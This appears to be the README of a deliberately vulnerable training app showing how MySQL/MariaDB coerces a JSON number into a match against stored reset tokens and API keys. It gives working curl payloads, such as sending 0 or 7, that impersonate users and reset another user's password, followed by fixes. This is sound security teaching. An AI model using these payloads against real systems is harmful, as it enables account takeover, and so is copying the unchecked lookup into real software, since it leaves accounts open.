# Token Zero lab

A very small, **intentionally vulnerable** web app for security training. It
shows one bug: a secret (password-reset token, API key) is sent as a JSON
**number** instead of a string, and MySQL/MariaDB then matches it against stored
secrets it should never match. Sending `0` is often enough. **Warning:** the app
is vulnerable on purpose. Run it only on
your own machine, bound to `127.0.0.1`, and never expose it to a network.

## Run it

```sh
docker compose up --build
```

This starts two containers: MariaDB and the app. The app is published on
`http://127.0.0.1:3000` only; the database is not published at all. Stop with
Ctrl-C, and remove the containers with `docker compose down`.

On every start the app recreates the `users` table, so
`docker compose restart app` restores the demo data.

Note: the Docker files have **not been built or run by their author**.

## Why it happens

JSON has types: `{"token":"0"}` carries a string, `{"token":0}` carries a
number, and `express.json()` keeps that difference. The app passes the value to
a parameterised query, `WHERE reset_token = ?`. That stops SQL injection, but it
does not change the type: the driver (`mysql2`) sends a JavaScript number as a
number. The database receives `reset_token = 0`, not `reset_token = '0'`.

When MySQL or MariaDB compares a string column with a number, it converts the
**string to a number**. It reads the longest numeric prefix and ignores the
rest; a string with no numeric prefix becomes 0:

```sql
SELECT 'kq8ZrmWxTnPa' = 0;     -- 1 (true): no leading number, so the string counts as 0
SELECT '7b2e9fd0c1a4' = 7;     -- 1 (true): the leading "7" is used, the rest is ignored
SELECT '12e2xk40cd9f' = 1200;  -- 1 (true): "12e2" is read as 12 x 10^2
SELECT '7b2e9fd0c1a4' = '7';   -- 0 (false): string against string compares the whole value
```

## Try it

The demo users (passwords are `alice-password`, `bob-password`, and so on):

| Email | Reset token | API key | The secrets as numbers |
|---|---|---|---|
| alice@lab.test | `kq8ZrmWxTnPa` | `zk5f3a9cd17b` | 0 and 0 |
| bob@lab.test | `7b2e9fd0c1a4` | `7fa93c0de215` | 7 and 7 |
| carol@lab.test | `4821fa09bc77` | `305c1d88e0ab` | 4821 and 305 |
| dave@lab.test | `12e2xk40cd9f` | `3e1x9k27ab6c` | 1200 and 30 |

Copy and paste in this order, on a freshly started app. Each `#` line is the
real response (MariaDB 10.11.14, Node 22, express 5.1.0, mysql2 3.24.6).

```sh
# 1. The real secret, as a string: normal use.
curl -s -X POST http://127.0.0.1:3000/whoami -H 'Content-Type: application/json' -d '{"apiKey":"zk5f3a9cd17b"}'
# {"message":"You are alice@lab.test"}

# 2. The string "0" is a wrong key and is rejected.
curl -s -X POST http://127.0.0.1:3000/whoami -H 'Content-Type: application/json' -d '{"apiKey":"0"}'
# {"error":"Invalid API key"}

# 3. The number 0 (no quotes). Alice's key starts with a letter, so it counts as 0.
curl -s -X POST http://127.0.0.1:3000/whoami -H 'Content-Type: application/json' -d '{"apiKey":0}'
# {"message":"You are alice@lab.test"}

# 4. A non-zero number. Bob's key starts with "7" and then a letter.
curl -s -X POST http://127.0.0.1:3000/whoami -H 'Content-Type: application/json' -d '{"apiKey":7}'
# {"message":"You are bob@lab.test"}

# 5. An exponent. Dave's key starts with "3e1", which is read as 3 x 10^1 = 30.
curl -s -X POST http://127.0.0.1:3000/whoami -H 'Content-Type: application/json' -d '{"apiKey":30}'
# {"message":"You are dave@lab.test"}
```

Now the password reset, checked with `POST /login` before and after. Run
`docker compose restart app` afterwards to restore the demo data.

```sh
# 6. Before: Alice logs in with her own password.
curl -s -X POST http://127.0.0.1:3000/login -H 'Content-Type: application/json' -d '{"email":"alice@lab.test","password":"alice-password"}'
# {"message":"Logged in as alice@lab.test"}

# 7. The string "0" is a wrong token.
curl -s -X POST http://127.0.0.1:3000/reset-password -H 'Content-Type: application/json' -d '{"email":"alice@lab.test","token":"0","newPassword":"hacked"}'
# {"error":"Invalid email or token"}

# 8. The number 0 is accepted.
curl -s -X POST http://127.0.0.1:3000/reset-password -H 'Content-Type: application/json' -d '{"email":"alice@lab.test","token":0,"newPassword":"hacked"}'
# {"message":"Password changed for alice@lab.test"}

# 9. After: Alice's own password no longer works...
curl -s -X POST http://127.0.0.1:3000/login -H 'Content-Type: application/json' -d '{"email":"alice@lab.test","password":"alice-password"}'
# {"error":"Wrong email or password"}

# 10. ...and the new one does.
curl -s -X POST http://127.0.0.1:3000/login -H 'Content-Type: application/json' -d '{"email":"alice@lab.test","password":"hacked"}'
# {"message":"Logged in as alice@lab.test"}

# 11. The email is not checked either: email = 0 is true for every address that starts with a letter.
curl -s -X POST http://127.0.0.1:3000/reset-password -H 'Content-Type: application/json' -d '{"email":0,"token":1200,"newPassword":"hacked"}'
# {"message":"Password changed for dave@lab.test"}
```

## How to fix

The simplest fix is one line per handler, as in the `FIX:` comments in `app.js`:

```js
if (typeof email !== 'string' || typeof token !== 'string') return res.status(400).end();
if (typeof apiKey !== 'string') return res.status(400).end();
```

Check every looked-up value, not only the token (see command 11). Alternatives:

- **Cast to a string**: `String(token)` in JavaScript, or
  `WHERE reset_token = CAST(? AS CHAR)` in SQL. Both were checked here with the
  number `0`: no row matched.
- **Store and look up a hash of the token** (for example SHA-256), so the
  lookup is string against string. This one was not run in this lab.

Two things do **not** help for the lookup. **Strict `sql_mode`:** the outputs
above are from the MariaDB default (which includes `STRICT_TRANS_TABLES`), and
`api_key = 0` still matched Alice under `STRICT_ALL_TABLES`; a `SELECT` only
gets a warning (`Truncated incorrect DECIMAL value: 'zk5f3a9cd17b'`).
**Prepared statements:** with `mysql2`'s `execute()` instead of `query()`, `0`
and `7` matched the same rows.

## Other databases

Only MariaDB 10.11 was tested. MySQL documents the same string-to-number
comparison rule, but MySQL was **not run** here. PostgreSQL, SQLite, SQL Server
and Oracle were **not tested**, so this README makes no claim about them; the
result also depends on what the driver or ORM does with a non-string value.
Test your own stack, and check that a secret is a string before you use it.
